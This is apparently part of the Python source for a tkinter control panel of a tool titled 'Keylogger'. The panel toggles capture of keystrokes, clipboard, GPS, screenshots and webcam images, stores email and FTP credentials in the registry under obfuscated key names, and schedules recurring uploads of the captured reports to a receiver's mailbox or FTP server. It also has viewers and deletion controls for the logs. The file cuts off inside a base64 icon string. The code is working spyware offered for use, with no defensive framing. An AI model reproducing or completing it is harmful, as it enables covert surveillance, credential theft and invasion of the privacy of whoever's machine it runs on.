        self.msg.config(state='normal') #update status bar
        self.msg.config(fg='black')
        self.msg.delete(0, tk.END)
        self.msg.insert(0, 'Checking settings...')
        self.msg.config(state='readonly')
        if not self.save_settings(): #save settings
            self.msg.config(state='normal') #update status bar
            self.msg.config(fg='red')
            self.msg.delete(0, tk.END)
            self.msg.insert(0, 'Error!')
            self.msg.config(state='readonly')
            self.apply_button.config(state='normal')
        threading.Thread(target=run).start() #start sending email
            
    def render(self):
        tk.Label(self.root, text='Sender Email').grid(row=1, column=1)
        tk.Label(self.root, text='Sender Password').grid(row=2, column=1)
        tk.Label(self.root, text='Receiver Email').grid(row=3, column=1)
        tk.Label(self.root, text='SMTP Server').grid(row=1, column=3)
        tk.Label(self.root, text='Port').grid(row=2, column=3)
        tk.Label(self.root, text='Interval').grid(row=4, column=1)
        tk.Label(self.root, text='Second Interval').grid(row=5, column=1)
        
        self.text_field_1 = tk.Entry(self.root, width=30) #sender
        self.text_field_2 = tk.Entry(self.root, width=30, show="*") #password
        self.text_field_3 = tk.Entry(self.root, width=30) #receiver
        self.text_field_4 = tk.Entry(self.root, width=30) #server
        self.text_field_5 = tk.Entry(self.root, width=30) #port
        self.text_field_1.grid(row=1, column=2)
        self.text_field_2.grid(row=2, column=2)
        self.text_field_3.grid(row=3, column=2)
        self.text_field_4.grid(row=1, column=4)
        self.text_field_5.grid(row=2, column=4)

        self.text_field_1.insert(0, Config().sender_email)
        self.text_field_2.insert(0, Config().sender_password)
        self.text_field_3.insert(0, Config().receiver_email)
        self.text_field_4.insert(0, Config().smtp_server)
        self.text_field_5.insert(0, Config().smtp_port)

        options = [
        'Never', #0
        'At Startup', #1
        'Once a day', #2
        'Once every 3 days', #3
        'Once a week', #4
        ]
        self.op_1 = tk.StringVar(self.root)
        self.op_1.set(options[Config().email_interval_1])
        tk.OptionMenu(self.root, self.op_1, *options).grid(row=4, column=2, columnspan=3, sticky='news')
        self.op_2 = tk.StringVar(self.root)
        self.op_2.set(options[Config().email_interval_2])
        tk.OptionMenu(self.root, self.op_2, *options).grid(row=5, column=2, columnspan=3, sticky='news')
        
        self.msg = tk.Entry(self.root, justify='center')
        self.msg.grid(row=6, column=1, columnspan=4, sticky='news')
        self.msg.config(state='readonly')

        self.apply_button = tk.Button(self.root, text='APPLY', font=font.Font(size=8, weight='bold'), command=self.send_email)
        self.apply_button.grid(row=7, column=1, columnspan=4, sticky='news')

class FTP(object):
    def __init__(self, root):
        self.root = root
        self.render()

    def save_settings(self):
        reg_path_settings = Config().reg_path_settings
        r = Config().r
        r.set_reg(reg_path_settings, '5738192731', Config().v.encrypt(str(self.text_field_1.get()), Config().vigenere_key)) #username
        r.set_reg(reg_path_settings, '7365819274', Config().v.encrypt(str(self.text_field_2.get()), Config().vigenere_key)) #password
        r.set_reg(reg_path_settings, '6748263916', Config().v.encrypt(str(self.text_field_3.get()), Config().vigenere_key)) #server_path
        r.set_reg(reg_path_settings, '1827395812', Config().v.encrypt(str(self.text_field_4.get()), Config().vigenere_key)) #ftp_server
        if not str(self.text_field_5.get()).isdigit():
            BasicFunction().popup_msg(2, 'Error', 'Invalid FTP Port!')
            return False
        r.set_reg(reg_path_settings, '8192736412', Config().v.encrypt(str(self.text_field_5.get()), Config().vigenere_key)) #ftp_port
        ftp_interval_1 = str(self.op_1.get())
        if ftp_interval_1 == 'Never':
            c.delete_task('send_email_1')
            ftp_interval_1 = 0
        elif ftp_interval_1 == 'At Startup':
            ftp_interval_1 = 1
        elif ftp_interval_1 == 'Once a day':
            ftp_interval_1 = 2
        elif ftp_interval_1 == 'Once every 3 days':
            ftp_interval_1 = 3
        elif ftp_interval_1 == 'Once a week':
            ftp_interval_1 = 4
        r.set_reg(reg_path_settings, '8519381032', str(ftp_interval_1)) #ftp_interval_1
        ftp_interval_2 = str(self.op_2.get())
        if ftp_interval_2 == 'Never':
            c.delete_task('send_email_2')
            ftp_interval_2 = 0
        elif ftp_interval_2 == 'At Startup':
            ftp_interval_2 = 1
        elif ftp_interval_2 == 'Once a day':
            ftp_interval_2 = 2
        elif ftp_interval_2 == 'Once every 3 days':
            ftp_interval_2 = 3
        elif ftp_interval_2 == 'Once a week':
            ftp_interval_2 = 4
        r.set_reg(reg_path_settings, '4182958123', str(ftp_interval_2)) #ftp_interval_2
        return True
        
    def upload_ftp(self):
        self.apply_button.config(state='disabled')
        def run():
            status = Tools().upload_ftp()
            if status == True:
                #set cronjob
                #read config
                ftp_interval_1 = str(Config().ftp_interval_1)
                ftp_interval_2 = str(Config().ftp_interval_2)                
                if ftp_interval_1 == '0':
                    ftp_interval_1 = -2
                elif ftp_interval_1 == '1':
                    ftp_interval_1 = -1
                elif ftp_interval_1 == '2':
                    ftp_interval_1 = 24
                elif ftp_interval_1 == '3':
                    ftp_interval_1 = 72
                elif ftp_interval_1 == '4':
                    ftp_interval_1 = 168
                    
                if ftp_interval_2 == '0':
                    ftp_interval_2 = -2
                elif ftp_interval_2 == '1':
                    ftp_interval_2 = -1
                elif ftp_interval_2 == '2':
                    ftp_interval_2 = 24
                elif ftp_interval_2 == '3':
                    ftp_interval_2 = 72
                elif ftp_interval_2 == '4':
                    ftp_interval_ = 168

                c.delete_task('upload_ftp_1')
                c.delete_task('upload_ftp_2')
                #task 1
                if ftp_interval_1 > 0:
                    c.set_task('upload_ftp_1', ftp_interval_1) #if not at startup or never
                #task 2
                if ftp_interval_2 > 0:
                    c.set_task('upload_ftp_2', ftp_interval_2) #if not at startup or never
                
                self.msg.config(state='normal')
                self.msg.config(fg='green')
                self.msg.delete(0, tk.END)
                self.msg.insert(0, 'Success!')
                self.msg.config(state='readonly')
            else:
                if '500' in status or '530' in status:
                    status = 'Username and Password not accepted.'
                elif 'getaddrinfo failed' in status or 'established connection failed' in status or 'No connection could be made' in status:
                    status = 'Cannot connect to server.'
                elif 'Cannot create report!' in status:
                    status = 'Cannot create report!'
                else:
                    status = 'Unknown error occurred! Please try again later.'
                    
                self.msg.config(state='normal')
                self.msg.config(fg='red')
                self.msg.delete(0, tk.END)
                self.msg.insert(0, 'Error: ' + str(status))
                self.msg.config(state='readonly')
            self.apply_button.config(state='normal')

        self.msg.config(state='normal') #update status bar
        self.msg.config(fg='black')
        self.msg.delete(0, tk.END)
        self.msg.insert(0, 'Checking settings...')
        self.msg.config(state='readonly')
        if not self.save_settings(): #save settings
            self.msg.config(state='normal') #update status bar
            self.msg.config(fg='red')
            self.msg.delete(0, tk.END)
            self.msg.insert(0, 'Error!')
            self.msg.config(state='readonly')
            self.apply_button.config(state='normal')
        threading.Thread(target=run).start() #start uploading
                
    def render(self):
        tk.Label(self.root, text='Username').grid(row=1, column=1)
        tk.Label(self.root, text='Password').grid(row=2, column=1)
        tk.Label(self.root, text='Server Folder').grid(row=3, column=1)
        tk.Label(self.root, text='FTP Server').grid(row=1, column=3)
        tk.Label(self.root, text='Port').grid(row=2, column=3)
        tk.Label(self.root, text='Interval').grid(row=4, column=1)
        tk.Label(self.root, text='Second Interval').grid(row=5, column=1)
        
        self.text_field_1 = tk.Entry(self.root, width=32) #sender
        self.text_field_2 = tk.Entry(self.root, width=32, show="*") #password
        self.text_field_3 = tk.Entry(self.root, width=32) #receiver
        self.text_field_4 = tk.Entry(self.root, width=33) #server
        self.text_field_5 = tk.Entry(self.root, width=33) #port
        self.text_field_1.grid(row=1, column=2)
        self.text_field_2.grid(row=2, column=2)
        self.text_field_3.grid(row=3, column=2)
        self.text_field_4.grid(row=1, column=4)
        self.text_field_5.grid(row=2, column=4)

        
        self.text_field_1.insert(0, Config().ftp_username)
        self.text_field_2.insert(0, Config().ftp_password)
        self.text_field_3.insert(0, Config().ftp_server_path)
        self.text_field_4.insert(0, Config().ftp_server)
        self.text_field_5.insert(0, Config().ftp_port)

        options = [
        'Never',
        'At Startup',
        'Once a day',
        'Once every 3 days',
        'Once a week',
        ]
        self.op_1 = tk.StringVar(self.root)
        self.op_1.set(options[Config().ftp_interval_1])
        tk.OptionMenu(self.root, self.op_1, *options).grid(row=4, column=2, columnspan=3, sticky='news')
        self.op_2 = tk.StringVar(self.root)
        self.op_2.set(options[Config().ftp_interval_2])
        tk.OptionMenu(self.root, self.op_2, *options).grid(row=5, column=2, columnspan=3, sticky='news')
        
        self.msg = tk.Entry(self.root, justify='center')
        self.msg.grid(row=6, column=1, columnspan=4, sticky='news')
        self.msg.config(state='readonly')

        self.apply_button = tk.Button(self.root, text='APPLY', font=font.Font(size=8, weight='bold'), command=self.upload_ftp)
        self.apply_button.grid(row=7, column=1, columnspan=4, sticky='news')


class Setting(object):
    def __init__(self, parent, root):
        self.parent = parent #close the root window when Start clicked
        self.root = root
        self.render()
    
    def toggle_button_1(self): #keyboard
        if self.switch_button_1.config('text')[-1] == 'ON':
            self.switch_button_1.config(text='OFF')
            self.switch_button_1.config(bg='red')
        else:
            self.switch_button_1.config(text='ON')
            self.switch_button_1.config(bg='green')
        self.switch_log_path()            
    def toggle_button_2(self): #clipboard
        if self.switch_button_2.config('text')[-1] == 'ON':
            self.switch_button_2.config(text='OFF')
            self.switch_button_2.config(bg='red')
        else:
            self.switch_button_2.config(text='ON')
            self.switch_button_2.config(bg='green')
        self.switch_log_path()
    def toggle_button_3(self): #gps
        if self.switch_button_3.config('text')[-1] == 'ON':
            self.switch_button_3.config(text='OFF')
            self.switch_button_3.config(bg='red')
        else:
            self.switch_button_3.config(text='ON')
            self.switch_button_3.config(bg='green')
        self.switch_log_path()
    def toggle_button_4(self): #screenshot
        if self.switch_button_4.config('text')[-1] == 'ON':
            self.switch_button_4.config(text='OFF')
            self.switch_button_4.config(bg='red')
        else:
            self.switch_button_4.config(text='ON')
            self.switch_button_4.config(bg='green')
        self.switch_log_path()
    def toggle_button_5(self): #camera
        if self.switch_button_5.config('text')[-1] == 'ON':
            self.switch_button_5.config(text='OFF')
            self.switch_button_5.config(bg='red')
        else:
            self.switch_button_5.config(text='ON')
            self.switch_button_5.config(bg='green')
        self.switch_log_path()
    def switch_log_path(self):
        if self.switch_button_1.config('text')[-1] == 'ON' or self.switch_button_2.config('text')[-1] == 'ON' or self.switch_button_3.config('text')[-1] == 'ON':
            self.path_1.config(state='normal')
        else:
            self.path_1.config(state='disabled')
        if self.switch_button_4.config('text')[-1] == 'ON':
            self.path_4.config(state='normal')
            self.interval_4.config(state='normal')
        else:
            self.path_4.config(state='disabled')
            self.interval_4.config(state='disabled')
        if self.switch_button_5.config('text')[-1] == 'ON':
            self.path_5.config(state='normal')
            self.interval_5.config(state='normal')
        else:
            self.path_5.config(state='disabled')
            self.interval_5.config(state='disabled')
        
    def check_settings(self):
        #keyboard, clipboard, gps
        log_path = self.path_1.get()
        if os.path.exists(log_path):
            pass
        elif os.access(os.path.dirname(log_path), os.W_OK):
            pass
        else:
            BasicFunction().popup_msg(2, "Error", "Cannot create Log folder!\nPlease change your folder.")
            return False
        #screenshot
        try:
            screenshot_interval = int(self.interval_4.get())*60
        except:
            BasicFunction().popup_msg(2, "Error", "Invalid Screenshot interval!")
            return False
        screenshot_path = self.path_4.get()
        if os.path.exists(screenshot_path):
            pass
        elif os.access(os.path.dirname(screenshot_path), os.W_OK):
            pass
        else:
            BasicFunction().popup_msg(2, "Error", "Cannot create Screenshot folder!\nPlease change your folder.")
            return False
        #check camera setting
        try:
            camera_interval = int(self.interval_5.get())*60
        except:
            BasicFunction().popup_msg(2, "Error", "Invalid Camera interval!")
            return False
        camera_path = self.path_5.get()
        if os.path.exists(camera_path):
            pass
        elif os.access(os.path.dirname(camera_path), os.W_OK):
            pass
        else:
            BasicFunction().popup_msg(2, "Error", "Cannot create Camera folder!\nPlease change your folder.")
            return False
        return True

    def reset_settings(self):
        working_dir = os.getcwd()
        self.path_1.config(state='normal')
        self.path_4.config(state='normal')
        self.path_5.config(state='normal')
        self.interval_4.config(state='normal')
        self.interval_5.config(state='normal')
        self.path_1.delete(0, tk.END)
        self.path_4.delete(0, tk.END)
        self.path_5.delete(0, tk.END)
        self.interval_4.delete(0, tk.END)
        self.interval_5.delete(0, tk.END)
        self.path_1.insert(0, str(os.path.join(working_dir, 'log',)))
        self.path_4.insert(0, str(os.path.join(working_dir, 'screenshot',)))
        self.path_5.insert(0, str(os.path.join(working_dir, 'camera',)))
        self.interval_4.insert(0, int(15))
        self.interval_5.insert(0, int(15))
        self.path_4.config(state='disabled')
        self.path_5.config(state='disabled')
        self.interval_4.config(state='disabled')
        self.interval_5.config(state='disabled')
        self.switch_button_1.config(text='ON')
        self.switch_button_1.config(bg='green')
        self.switch_button_2.config(text='OFF')
        self.switch_button_2.config(bg='red')
        self.switch_button_3.config(text='OFF')
        self.switch_button_3.config(bg='red')
        self.switch_button_4.config(text='OFF')
        self.switch_button_4.config(bg='red')
        self.switch_button_5.config(text='OFF')
        self.switch_button_5.config(bg='red')
        
    def save_settings(self):
        if not self.check_settings():
            return False
        reg_path_settings = Config().reg_path_settings
        r = Config().r
        
        Config().keyboard_enabled = str(self.switch_button_1.config('text')[-1])
        Config().clipboard_enabled = str(self.switch_button_2.config('text')[-1])
        Config().gps_enabled = str(self.switch_button_3.config('text')[-1])
        Config().screenshot_enabled = str(self.switch_button_4.config('text')[-1])
        Config().camera_enabled = str(self.switch_button_5.config('text')[-1])

        r.set_reg(reg_path_settings, '9347182837', str(self.switch_button_1.config('text')[-1]))
        r.set_reg(reg_path_settings, '8291837491', str(self.switch_button_2.config('text')[-1]))
        r.set_reg(reg_path_settings, '2838192953', str(self.switch_button_3.config('text')[-1]))
        r.set_reg(reg_path_settings, '5739172019', str(self.switch_button_4.config('text')[-1]))
        r.set_reg(reg_path_settings, '7329381723', str(self.switch_button_5.config('text')[-1]))     
        
        r.set_reg(reg_path_settings, '2193581253', str(self.path_1.get())) #log_path
        r.set_reg(reg_path_settings, '7235698253', str(self.path_4.get())) #screenshot_path
        r.set_reg(reg_path_settings, '5735638464', str(self.interval_4.get())) #screenshot_interval
        r.set_reg(reg_path_settings, '9874682374', str(self.path_5.get())) #camera_path
        r.set_reg(reg_path_settings, '3889734234', str(self.interval_5.get())) #camera_interval
        return True
        
    def start_button(self):
        if not self.save_settings():
            BasicFunction().popup_msg(2, "Error", "Something went wrong.\nPlease try again later.")
        self.parent.destroy() #close the root window when Start clicked
        Keylogger() #run keylogger here
        
    def render(self):
        keyboard_enabled = Config().keyboard_enabled
        clipboard_enabled = Config().clipboard_enabled
        gps_enabled = Config().gps_enabled
        screenshot_enabled = Config().screenshot_enabled
        camera_enabled = Config().camera_enabled
        
        tk.Label(self.root, text="CAPTURE", font=font.Font(size=10, weight='bold')).grid(row=0, column=0, padx=5, pady=5)
        tk.Label(self.root, text="INTERVAL (mins)", font=font.Font(size=10, weight='bold')).grid(row=0, column=3, padx=5, pady=5)
        tk.Label(self.root, text="PATH", font=font.Font(size=10, weight='bold')).grid(row=0, column=2, padx=5, pady=5)
        tk.Label(self.root, text="Keyboard").grid(row=1, column=0, padx=5, pady=5)
        tk.Label(self.root, text="Clipboard").grid(row=2, column=0, padx=5, pady=5)
        tk.Label(self.root, text="GPS").grid(row=3, column=0, padx=5, pady=5)
        tk.Label(self.root, text="Screenshot").grid(row=4, column=0, padx=5, pady=5)
        tk.Label(self.root, text="Camera").grid(row=5, column=0, padx=5, pady=5)

        #1-keyboard | 2-clipboard | 3-camera | 4-screenshot | 5-camera | 6-apply | 7-start
        #button
        self.switch_button_1 = tk.Button(self.root, text=keyboard_enabled, font=font.Font(size=8, weight='bold'), width=10, bg="red" if keyboard_enabled=='OFF' else "green", command=self.toggle_button_1)
        self.switch_button_2 = tk.Button(self.root, text=clipboard_enabled, font=font.Font(size=8, weight='bold'), width=10, bg="red" if clipboard_enabled=='OFF' else "green", command=self.toggle_button_2)
        self.switch_button_3 = tk.Button(self.root, text=gps_enabled, font=font.Font(size=8, weight='bold'), width=10, bg="red" if gps_enabled=='OFF' else "green", command=self.toggle_button_3)
        self.switch_button_4 = tk.Button(self.root, text=screenshot_enabled, font=font.Font(size=8, weight='bold'), width=10, bg="red" if screenshot_enabled=='OFF' else "green", command=self.toggle_button_4)
        self.switch_button_5 = tk.Button(self.root, text=camera_enabled, font=font.Font(size=8, weight='bold'), width=10, bg="red" if camera_enabled=='OFF' else "green", command=self.toggle_button_5)
        self.switch_button_6 = tk.Button(self.root, text="RESET", font=font.Font(size=8, weight='bold'), width=10, command=self.reset_settings)
        self.switch_button_7 = tk.Button(self.root, text="APPLY", font=font.Font(size=8, weight='bold'), width=10, command=self.save_settings)
        self.switch_button_8 = tk.Button(self.root, text="START", font=font.Font(size=8, weight='bold'), width=10, command=self.start_button)
        self.switch_button_1.grid(row=1, column=1, padx=5, pady=5)
        self.switch_button_2.grid(row=2, column=1, padx=5, pady=5)
        self.switch_button_3.grid(row=3, column=1, padx=5, pady=5)
        self.switch_button_4.grid(row=4, column=1, padx=5, pady=5)
        self.switch_button_5.grid(row=5, column=1, padx=5, pady=5)
        self.switch_button_6.grid(row=6, column=0, padx=5, pady=5)
        self.switch_button_7.grid(row=6, column=1, padx=5, pady=5)
        self.switch_button_8.grid(row=6, column=2, columnspan=2, padx=5, pady=5, sticky='news')

        #path input
        self.path_1 = tk.Entry(self.root, width=30)
        self.path_4 = tk.Entry(self.root, width=30)
        self.path_5 = tk.Entry(self.root, width=30)
        self.path_1.insert(0, Config().log_path)
        self.path_4.insert(0, Config().screenshot_path)
        self.path_5.insert(0, Config().camera_path)
        self.path_1.config(state='disabled')
        self.path_4.config(state='disabled')
        self.path_5.config(state='disabled')
        self.path_1.grid(row=1, column=2, rowspan=3, padx=5, pady=5)
        self.path_4.grid(row=4, column=2, padx=5, pady=5)
        self.path_5.grid(row=5, column=2, padx=5, pady=5)

        #interval input
        self.interval_4 = tk.Entry(self.root)
        self.interval_5 = tk.Entry(self.root)
        self.interval_4.insert(0, Config().screenshot_interval)
        self.interval_5.insert(0, Config().camera_interval)
        self.interval_4.config(state='disabled')
        self.interval_5.config(state='disabled')
        self.interval_4.grid(row=4, column=3, padx=5, pady=5)
        self.interval_5.grid(row=5, column=3, padx=5, pady=5)
        
        self.switch_log_path() #enable or disable path editor

class Log(object):
    def __init__(self, root):
        self.root = root
        self.render()

    def view_log(self):
        error = False
        date = str(self.cal.selection_get())
        file_name = os.path.join(str(Config().log_path), date.replace('-', '') + '.txt')
        #print(file_name)
        try:
            f = open(file_name, 'r', encoding='utf-8')
        except:
            error = True
            self.msg.config(state='normal')
            self.msg.config(fg='red')
            self.msg.delete(0, tk.END)
            self.msg.insert(0, date + ': No records found!')
            self.msg.config(state='readonly')
        if not error:
            self.msg.config(state='normal')
            self.msg.config(fg='green')
            self.msg.delete(0, tk.END)
            self.msg.insert(0, date + ': Found')
            self.msg.config(state='readonly')
            lines = f.readlines() #read file
            f.close()
            top = tk.Toplevel() #new pop-up window
            top.title('Keyboard Log ' + date)
            top.resizable(False, False)
            text = scrolledtext.ScrolledText(top) #create scroll textbox
            text.grid(sticky='news')
            for line in lines:
                text.insert(tk.END, line) #append lines
            text.config(state='disabled')

    def view_screenshot(self):
        w, h = 1200, 800 #size of image
        def get_list_box():
            img_name = list_box.get('active')
            #print(os.path.join(folder_name, img_name))
            img = Image.open(os.path.join(folder_name, img_name))
            img = img.resize((w,h))
            img = ImageTk.PhotoImage(img)
            canvas.create_image(w//2, h//2, image=img)
            canvas.image = img
        def open_folder():
            subprocess.Popen('start ' + os.path.join(str(Config().screenshot_path), date.replace('-', '')), shell=True)
        error = False
        date = str(self.cal.selection_get())
        folder_name = os.path.join(str(Config().screenshot_path), date.replace('-', ''))
        #print(folder_name)
        try:
            imgs = os.listdir(folder_name)
            if len(imgs) == 0:                    
                error = True
                self.msg.config(state='normal')
                self.msg.config(fg='red')
                self.msg.delete(0, tk.END)
                self.msg.insert(0, date + ': No records found!')
                self.msg.config(state='readonly')
        except:
            error = True
            self.msg.config(state='normal')
            self.msg.config(fg='red')
            self.msg.delete(0, tk.END)
            self.msg.insert(0, date + ': No records found!')
            self.msg.config(state='readonly')
        if not error:
            self.msg.config(state='normal')
            self.msg.config(fg='green')
            self.msg.delete(0, tk.END)
            self.msg.insert(0, date + ': Found')
            self.msg.config(state='readonly')
            top = tk.Toplevel() #new pop-up window
            top.title('Screenshot Log ' + date)
            top.resizable(False, False)
            
            list_box = tk.Listbox(top) #create listbox
            sx = tk.Scrollbar(top, orient="horizontal",command=list_box.xview)
            sy = tk.Scrollbar(top, orient="vertical",command=list_box.yview)
            sx.grid(row=2, column=1, sticky='ew')
            sy.grid(row=1, column=2, sticky='ns')
            list_box.config(xscrollcommand=sx.set)
            list_box.config(yscrollcommand=sy.set)
            
            list_box.grid(row=1, column=1, sticky='news')
            for img in imgs:
                list_box.insert(tk.END, str(img)) #append lines
            view_image_button = tk.Button(top, text='View Image', command=get_list_box)
            open_folder_button = tk.Button(top, text='Open Folder', command=open_folder)
            view_image_button.grid(row=1, column=3)
            open_folder_button.grid(row=1, column=4)
            canvas = tk.Canvas(top, width = w, height = h)
            canvas.grid(row=1, column=5)
            
    def view_camera(self):
        w, h = 1200, 800 #size of image
        def get_list_box():
            img_name = list_box.get('active')
            #print(os.path.join(folder_name, img_name))
            img = Image.open(os.path.join(folder_name, img_name))
            img = img.resize((w,h))
            img = ImageTk.PhotoImage(img)
            canvas.create_image(w//2, h//2, image=img)
            canvas.image = img
        def open_folder():
            subprocess.Popen('start ' + os.path.join(str(Config().camera_path), date.replace('-', '')), shell=True)
        error = False
        date = str(self.cal.selection_get())
        folder_name = os.path.join(str(Config().camera_path), date.replace('-', ''))
        #print(folder_name)
        try:
            imgs = os.listdir(folder_name)
            if len(imgs) == 0:                    
                error = True
                self.msg.config(state='normal')
                self.msg.config(fg='red')
                self.msg.delete(0, tk.END)
                self.msg.insert(0, date + ': No records found!')
                self.msg.config(state='readonly')
        except:
            error = True
            self.msg.config(state='normal')
            self.msg.config(fg='red')
            self.msg.delete(0, tk.END)
            self.msg.insert(0, date + ': No records found!')
            self.msg.config(state='readonly')
        if not error:
            self.msg.config(state='normal')
            self.msg.config(fg='green')
            self.msg.delete(0, tk.END)
            self.msg.insert(0, date + ': Found')
            self.msg.config(state='readonly')
            top = tk.Toplevel() #new pop-up window
            top.title('Camera Log ' + date)
            top.resizable(False, False)
            
            list_box = tk.Listbox(top) #create listbox
            sx = tk.Scrollbar(top, orient="horizontal",command=list_box.xview)
            sy = tk.Scrollbar(top, orient="vertical",command=list_box.yview)
            sx.grid(row=2, column=1, sticky='ew')
            sy.grid(row=1, column=2, sticky='ns')
            list_box.config(xscrollcommand=sx.set)
            list_box.config(yscrollcommand=sy.set)
            
            list_box.grid(row=1, column=1, sticky='news')
            for img in imgs:
                list_box.insert(tk.END, str(img)) #append lines
            view_image_button = tk.Button(top, text='View Image', command=get_list_box)
            open_folder_button = tk.Button(top, text='Open Folder', command=open_folder)
            view_image_button.grid(row=1, column=3)
            open_folder_button.grid(row=1, column=4)
            canvas = tk.Canvas(top, width = w, height = h)
            canvas.grid(row=1, column=5)

    def clear_selected_log(self):
        confirm_box = tk.messagebox.askquestion ('Confirm Action', 'Are you sure you want to delete log for the selected day?', icon = 'warning')
        if confirm_box == 'yes':
            date = str(self.cal.selection_get())
            folder_name = os.path.join(str(Config().screenshot_path), date.replace('-', ''))
            if os.path.isdir(folder_name):
                shutil.rmtree(folder_name)
            folder_name = os.path.join(str(Config().camera_path), date.replace('-', ''))
            if os.path.isdir(folder_name):
                shutil.rmtree(folder_name)
            file_name = os.path.join(str(Config().log_path), date.replace('-', '') + '.txt')
            if os.path.isfile(file_name):
                os.remove(file_name)

    def clear_all_log(self):
        confirm_box = tk.messagebox.askquestion ('Confirm Action', 'Are you sure you want to delete the entire log?', icon = 'warning')
        if confirm_box == 'yes':
            if os.path.isdir(str(Config().screenshot_path)):
                shutil.rmtree(str(Config().screenshot_path))
            if os.path.isdir(str(Config().camera_path)):
                shutil.rmtree(str(Config().camera_path))
            if os.path.isdir(str(Config().log_path)):
                shutil.rmtree(str(Config().log_path))
        
    def render(self):
        self.msg = tk.Entry(self.root, justify='center')
        self.msg.config(state='readonly')
        self.msg.grid(row=1, column=1, columnspan=2, sticky='news')
        
        self.cal = Calendar(self.root, selectmode='day')
        self.cal.grid(row=2, column=1, rowspan=5, sticky='nesw')
        
        button_2 = tk.Button(self.root, text='View Keyboard Log', width=25, command=self.view_log)
        button_3 = tk.Button(self.root, text='View Screenshot Log', width=25, command=self.view_screenshot)
        button_4 = tk.Button(self.root, text='View Camera Log', width=25, command=self.view_camera)
        button_5 = tk.Button(self.root, text='Clear Log Selected Day', width=25, command=self.clear_selected_log)
        button_6 = tk.Button(self.root, text='Clear All Log', width=25, command=self.clear_all_log)
        button_2.grid(row=2, column=2, sticky='ns')
        button_3.grid(row=3, column=2, sticky='ns')
        button_4.grid(row=4, column=2, sticky='ns')
        button_5.grid(row=5, column=2, sticky='ns')
        button_6.grid(row=6, column=2, sticky='ns')

class SendReport(object):
    def __init__(self, root):
        tab_control = ttk.Notebook(root)

        tab_1 = ttk.Frame(tab_control)
        tab_2 = ttk.Frame(tab_control)

        Email(tab_1)
        FTP(tab_2)

        tab_control.add(tab_1, text='Email')
        tab_control.add(tab_2, text='FTP')
        tab_control.grid()

class GUI(object):
    def __init__(self):
        self.root = tk.Tk()
        self.root.title('Keylogger')
        icon = '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